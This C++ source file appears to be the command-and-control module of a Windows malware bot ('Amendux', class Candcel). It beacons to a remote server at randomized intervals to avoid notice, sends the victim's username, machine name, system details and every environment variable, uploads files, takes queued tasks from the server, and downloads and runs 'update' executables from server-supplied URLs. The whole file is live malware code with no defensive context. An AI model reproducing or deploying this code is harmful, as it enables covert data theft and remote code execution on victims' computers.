#include "stdafx.h"
#include "Log.h"
#include "Config.h"
#include "Process.h"
#include "RestClient.h"
#include "TaskQueue.h"
#include "TransferClient.h"
#include "Json.h"
#include "Candcel.h"

using namespace Amendux;

Candcel *Candcel::s_Candcel = nullptr;

Candcel::Candcel()
{
	LogInfo(L"Candcel", L"Initialize candcel class");
}


Candcel::~Candcel()
{
	LogInfo(L"Candcel", L"Terminate candcel class");
}


void Candcel::InitClass()
{
	if (!Config::Current()->CanConnect()) {
		return;
	}

	while (!IsAlive()) {
		DeepSleep();
	}

	Solicit();

	if (!Config::Current()->CanUpdate()) {
		return;
	}

	CheckForUpdate();
}


bool Candcel::IsAlive()
{
	LogInfo(L"Candcel", L"Check if server is alive");

	for (int i = 0; i < 10; ++i) {
		RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());

		rc.Call(RestClientCommand::CM_CLIENT_PING, new JSONValue);

		if (rc.getServerCode() == RestServerCommand::CM_SERVER_PONG) {
			return true;
		}

		LogError(L"Candcel", L"Server did not respond as expected, attempt " + std::to_wstring(i));

		Sleep(1000);
	}

	LogError(L"Candcel", L"Server did not respond as expected, giving up");

	return false;
}


DWORD Candcel::CheckIn()
{
	while (true) {
		int nextInterval = (rand() % (CHECKIN_PACE + 1));

		/* Randomize the interval for obvious reasons */
		Sleep(nextInterval * 60 * 1000);

		if (!serverSolicitAck) {
			Solicit();
		}

		if (!serverSolicitAck) {
			continue;
		}

		LogInfo(L"Candcel", L"Sending checkin request");

#ifdef DEBUG
		LARGE_INTEGER frequency;
		LARGE_INTEGER t1, t2;
		int elapsedTime;

		QueryPerformanceFrequency(&frequency);
		QueryPerformanceCounter(&t1);
#endif

		RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());

		JSONObject obj;
		obj[L"guid"] = new JSONValue(Config::Current()->Guid());

		JSONValue *returnObj = rc.Call(RestClientCommand::CM_CLIENT_CHECKIN, new JSONValue(obj));

		if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
			LogError(L"Candcel", L"Request failed");
		}

#ifdef DEBUG
		QueryPerformanceCounter(&t2);
		elapsedTime = (int)((t2.QuadPart - t1.QuadPart) * 1000 / frequency.QuadPart);

		LogInfo(L"Candcel", L"Remote at " + std::to_wstring(elapsedTime) + L"ms");
#endif

		/* Check for tasks */
		if (returnObj) {
			if (returnObj->IsObject()) {
				if (returnObj->HasChild(L"task")) {
					std::wstring mod = returnObj->Child(L"mod")->AsString();
					
					Task task(mod);

					if (returnObj->HasChild(L"param")) {
						for (auto const& param : returnObj->Child(L"param")->AsObject()) {

							if (param.second->IsArray() || param.second->IsObject()) {
								continue;
							}

							task.params[param.first] = param.second->Stringify();
						}
					}

					/* Put task on queue */
					TaskQueue::Current()->Add(task);
				}
			}
		}

		checkInCount++;

		/* Solicit about every two hours */
		if (checkInCount % 8 == 0) {
			Solicit();
		}

		/* Check for updates after about a day */
		if (checkInCount > SOLICIT_PACE) {
			CheckForUpdate();
			checkInCount = 0;
		}
	}

	return 0;
}


void Candcel::Solicit()
{
	LogInfo(L"Candcel", L"Notify the server of this instance");

	RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());

	std::map<std::wstring, std::wstring> *lEnv = Util::EnvVariables();

	JSONObject env;
	for (std::map<std::wstring, std::wstring>::iterator it = lEnv->begin(); it != lEnv->end(); it++) {
		env[it->first] = new JSONValue(it->second);
	}

	delete lEnv;

	JSONObject obj;
	obj[L"guid"] = new JSONValue(Config::Current()->Guid());
	obj[L"cliver"] = new JSONValue(Config::getVersion());
	obj[L"winver"] = new JSONValue(Util::winver());
	obj[L"corenum"] = new JSONValue(std::to_wstring(Util::cpuCores()));
	obj[L"maxmem"] = new JSONValue(std::to_wstring(Util::maxmem()));
	obj[L"user"] = new JSONValue(Util::user());
	obj[L"computer"] = new JSONValue(Util::machine());
	obj[L"resolution"] = new JSONValue(Util::windowResolution());
	obj[L"timezone"] = new JSONValue(Util::timezoneName());
	obj[L"variant"] = new JSONValue(Config::Current()->DisplayName());
	obj[L"env"] = new JSONValue(env);

	rc.Call(RestClientCommand::CM_CLIENT_SOLICIT, new JSONValue(obj));

	if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
		LogError(L"Candcel", L"Request failed");

		serverSolicitAck = false;
		return;
	}

	serverSolicitAck = true;
}


void Candcel::UploadFile(const std::wstring& name, const std::wstring& content)
{
	LogInfo(L"Candcel", L"Upload file to server");

	if (content.size() > 128 * 1024) {
		LogError(L"Candcel", L"File too large");
		return;
	}

	RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());

	JSONObject obj;
	obj[L"guid"] = new JSONValue(Config::Current()->Guid());
	obj[L"name"] = new JSONValue(name);
	obj[L"content"] = new JSONValue(content);

	rc.Call(RestClientCommand::CM_CLIENT_UPLOAD, new JSONValue(obj));

	if (rc.getServerCode() != RestServerCommand::CM_SERVER_ACK) {
		LogError(L"Candcel", L"Request failed");
	}
}


void Candcel::GetUpdate(unsigned int buildNumber, const std::wstring& wurl)
{
	if (!serverSolicitAck) {
		return;
	}

	LogInfo(L"Candcel", L"Sending update request for version " + Config::getVersion(buildNumber));

	std::string url(wurl.begin(), wurl.end());

	TransferClient tc(url);
	std::wstring tmpFile = tc.Download();

	if (tmpFile.empty()) {
		return;
	}

	Process::RunUpdateInstance(tmpFile);
}


void Candcel::CheckForUpdate()
{
	if (!serverSolicitAck) {
		return;
	}

	LogInfo(L"Candcel", L"Check for update");

	RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());

	JSONObject obj;
	obj[L"build"] = new JSONValue((double)clientVersion);

	JSONValue *returnObj = rc.Call(RestClientCommand::CM_CLIENT_UPDATE, new JSONValue(obj));

	if (rc.getServerCode() == RestServerCommand::CM_SERVER_UPDATE) {
		if (!returnObj->IsObject()) {
			LogError(L"Candcel", L"Server returned no object");
			return;
		}

		LogInfo(L"Candcel", L"Update available");

		unsigned int build = static_cast<unsigned int>(returnObj->Child(L"build")->AsNumber());
		std::wstring url = returnObj->Child(L"url")->AsString();

		GetUpdate(build, url);
	} else if (rc.getServerCode() != RestServerCommand::CM_SERVER_IGNORE) {
		LogError(L"Candcel", L"Request failed");
	}
}


void Candcel::DeepSleep()
{
	LogWarn(L"Candcel", L"Enter deepsleep");

	Sleep(30 * 60 * 1000);
}
